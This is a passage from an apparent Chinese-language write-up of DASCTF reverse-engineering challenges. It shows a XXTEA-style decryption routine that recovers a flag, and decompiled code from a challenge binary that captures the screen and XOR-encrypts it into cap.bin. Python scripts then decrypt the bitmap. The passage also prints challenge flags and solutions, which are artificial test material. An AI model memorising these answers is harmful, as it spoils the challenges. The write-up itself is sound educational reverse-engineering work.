&gt;&gt; 2) &amp; 3;        for (p=n-1; p&gt;0; p--) {          z = v[p-1];          y = v[p] -= MX;        }        z = v[n-1];        y = v[0] -= MX;      } while ((sum -= DELTA) != 0);    }  } int main(){    //uint32_t const key[4]={0x01234567,0x89ABCDEF,0xFEDCBA98,0x76543210};    uint32_t key[4] = {0};    key[0] = 0x4B5F;    key[1] = 0xDEAD;    key[2] = 0x11ED;    key[3] = 0xB3CC;    //uint32_t data[2]={0x12345678,0x87654321};    uint32_t data[11];    data[0] = 0xCC45699D;    data[1] = 0x683D5352;    data[2] = 0xB8BB71A0;    data[3] = 0x0D3817AD;    data[4] = 0x7547E79E;    data[5] = 0x4BDD8C7C;    data[6] = 0x95E25A81;    data[7] = 0xC4525103;    data[8] = 0x7049B46F;    data[9] = 0x5417F77C;    data[10]= 0x65567138;    uint32_t *sent=data;    //btea(sent,1,key);    btea(sent,-11,key);    //printf(\"%s\\n\\n\",data);    for (int i = 0; i &lt; 44; i++){\t\tprintf(\"%c\",*((char *)data +i) &amp; 0xff);    }    return 0;}‍DASCTF{7eb20cb2-deac-11ed-ae42-94085339ce84}‍‍Reverse-cap‍  capture what?‍  主要逻辑代码  大概就是获取屏幕的图片 bmp 然后加密保存为cap.bin‍__int64 __fastcall sub_7FF651DA1030(HWND hWnd){  HBITMAP v2; // r14  HDC hdcSrc; // r13  HDC DC; // rsi  HDC CompatibleDC; // r15  int hSrc; // ebx  int wSrc; // eax  HBITMAP CompatibleBitmap; // rax  signed int v9; // ebx  HANDLE FileW; // rax  void *v11; // r12  signed int v12; // r10d  _BYTE *v13; // r9  int v14; // ecx  int v15; // edx  void *lpBuffer; // [rsp+60h] [rbp-59h]  HGLOBAL hMem; // [rsp+68h] [rbp-51h]  struct tagRECT Rect; // [rsp+70h] [rbp-49h] BYREF  struct tagBITMAPINFO bmi; // [rsp+80h] [rbp-39h] BYREF  char v21; // [rsp+ACh] [rbp-Dh]  char v22; // [rsp+ADh] [rbp-Ch]  char v23; // [rsp+AEh] [rbp-Bh]  char v24; // [rsp+AFh] [rbp-Ah]  char v25; // [rsp+B0h] [rbp-9h]  char v26; // [rsp+B1h] [rbp-8h]  int v27; // [rsp+B2h] [rbp-7h]  DWORD NumberOfBytesWritten; // [rsp+B8h] [rbp-1h] BYREF  char pv[4]; // [rsp+C0h] [rbp+7h] BYREF  LONG v30; // [rsp+C4h] [rbp+Bh]  UINT cLines; // [rsp+C8h] [rbp+Fh]  NumberOfBytesWritten = 0;  v2 = 0i64;  hdcSrc = GetDC(0i64);  DC = GetDC(hWnd);                             // GetDC函数为一个指定窗口的客户端区域或者整个屏幕从一个设备上下文(DC)中提取一个句柄  CompatibleDC = CreateCompatibleDC(DC);  if ( CompatibleDC )  {    GetClientRect(hWnd, &amp;Rect);    SetStretchBltMode(DC, 4);    hSrc = GetSystemMetrics(1);    wSrc = GetSystemMetrics(0);    if ( StretchBlt(DC, 0, 0, Rect.right, Rect.bottom, hdcSrc, 0, 0, wSrc, hSrc, 0xCC0020u) )    {      CompatibleBitmap = CreateCompatibleBitmap(DC, Rect.right - Rect.left, Rect.bottom - Rect.top);// CreateCompatibleBitmap函数创建的位图的颜色格式与hdc参数标识的设备的颜色格式匹配      v2 = CompatibleBitmap;      if ( CompatibleBitmap )      {        SelectObject(CompatibleDC, CompatibleBitmap);        if ( BitBlt(CompatibleDC, 0, 0, Rect.right - Rect.left, Rect.bottom - Rect.top, DC, 0, 0, 0xCC0020u) )        {          GetObjectW(v2, 32, pv);          bmi.bmiHeader.biWidth = v30;          bmi.bmiHeader.biHeight = cLines;          bmi.bmiHeader.biSize = 0x28;          *&amp;bmi.bmiHeader.biPlanes = 2097153i64;          memset(&amp;bmi.bmiHeader.biSizeImage, 0, 20);          v9 = 4 * cLines * ((32 * v30 + 31) / 32);          hMem = GlobalAlloc(0x42u, v9);          lpBuffer = GlobalLock(hMem);          GetDIBits(DC, v2, 0, cLines, lpBuffer, &amp;bmi, 0);          FileW = CreateFileW(L\"cap.bin\", 0x40000000u, 0, 0i64, 2u, 0x80u, 0i64);          v23 ^= 0x64u;          v24 ^= 0x61u;          v11 = FileW;          v25 ^= 0x73u;          v26 ^= 0x63u;          bmi.bmiHeader.biSize ^= 0x79625F63u;          bmi.bmiHeader.biWidth ^= 0x7361645Fu;          bmi.bmiHeader.biHeight ^= 0x65667463u;          *&amp;bmi.bmiHeader.biPlanes ^= 7017839094296175470ui64;          bmi.bmiColors[0].rgbReserved = ((v9 + 54) &gt;&gt; 8) ^ 0x62;          v21 = ((v9 + 54) &gt;&gt; 16) ^ 0x79;          v22 = ((v9 + 54) &gt;&gt; 24) ^ 0x5F;          v27 = 1852139074;          qmemcpy(bmi.bmiColors, \",.\", 2);          bmi.bmiColors[0].rgbRed = (v9 + 54) ^ 0x5F;          v12 = 0;          bmi.bmiHeader.biSizeImage ^= 0x66746373u;          bmi.bmiHeader.biXPelsPerMeter ^= 0x5F636E65u;          bmi.bmiHeader.biYPelsPerMeter ^= 0x645F7962u;          bmi.bmiHeader.biClrUsed ^= 0x74637361u;          bmi.bmiHeader.biClrImportant ^= 0x636E6566u;          if ( v9 &gt; 0 )          {            v13 = lpBuffer;            do            {              v14 = v12 + 3;              v15 = (1321528399i64 * (v12 + 3)) &gt;&gt; 32;              ++v12;              *v13++ ^= key[v14 - 13 * ((v15 &gt;&gt; 31) + (v15 &gt;&gt; 2))];            }            while ( v12 &lt; v9 );          }          WriteFile(FileW, bmi.bmiColors, 0xEu, &amp;NumberOfBytesWritten, 0i64);          WriteFile(v11, &amp;bmi, 0x28u, &amp;NumberOfBytesWritten, 0i64);          WriteFile(v11, lpBuffer, v9, &amp;NumberOfBytesWritten, 0i64);          GlobalUnlock(hMem);          GlobalFree(hMem);          CloseHandle(v11);        }        else        {          MessageBoxW(hWnd, L\"BitBlt has failed\", L\"Failed\", 0);        }      }      else      {        MessageBoxW(hWnd, L\"CreateCompatibleBitmap Failed\", L\"Failed\", 0);      }    }    else    {      MessageBoxW(hWnd, L\"StretchBlt has failed\", L\"Failed\", 0);    }  }  else  {    MessageBoxW(hWnd, L\"CreateCompatibleDC has failed\", L\"Failed\", 0);  }  DeleteObject(v2);  DeleteObject(CompatibleDC);  ReleaseDC(0i64, hdcSrc);  ReleaseDC(hWnd, DC);  return 0i64;}‍最后写入的lpBuffer也就是bmp 图像的数据段v3 指向的地址也就是 plBuffer‍  接下来就是找到v3 是和谁异或的,取得是key[]的值。动态分析一下把和 v13 异或的值取出来‍*v13++ ^= key[v14 - 13 * ((v15 &gt;&gt; 31) + (v15 &gt;&gt; 2))];‍​‍  断点脚本eax = get_reg_value('eax')print(chr(eax),end='')‍基本就是按照这个循环去异或_by_dasctfenc‍  先拿一个正常的BMP 看一下结构‍​​‍​​现在除了前0x36不知道是啥，但是后面的信息我们已经清楚加密流程了  解密key = list(b'_by_dasctf')f1 = open('C:/Users/GameG/Downloads/cap/cap.bin','rb').read()[0x36:]f2 = open('C:/Users/GameG/Downloads/cap/data.bmp','wb')f1 = bytearray(f1)for i in range(len(f1)):    f1[i] = f1[i] ^ key[i % len(key)]f2.write(bytes([0]*0x36))f2.write(bytes(f1))f2.close()‍  结果,考虑到这里的数据是异或加密的，那前面的也可以尝试解一下‍​​  正常的bmp 这个地方都是00 00 , 但加密后 是 我们的 密钥 enc_by_dasctf ，任何数异或0都是它本身，正好呢，0x36位置异或的是 _ 正好和前面的 enc 衔接上，大概前面也是异或，只是异或key的顺序不同‍​​‍key = list(b'nc_by_dasctfe')f1 = open('C:/Users/GameG/Downloads/cap/cap.bin','rb').read()f2 = open('C:/Users/GameG/Downloads/cap/data.bmp','wb')f1 = bytearray(f1)for i in range(len(f1)):    f1[i] = f1[i] ^ key[i % len(key)]f2.write(bytes(f1))f2.close()得到 原始图片​​‍Reverse-unsym‍看到字符串里有 go 的特征，先用脚本恢复一下go符号https://github.com/renshareck/IDAGolangHelper_SupportGo1.20​​用 Findcrypt 找到了一些加密算法 AES‍​​NoNo~~~~~~~~~~~"
  }
  
]

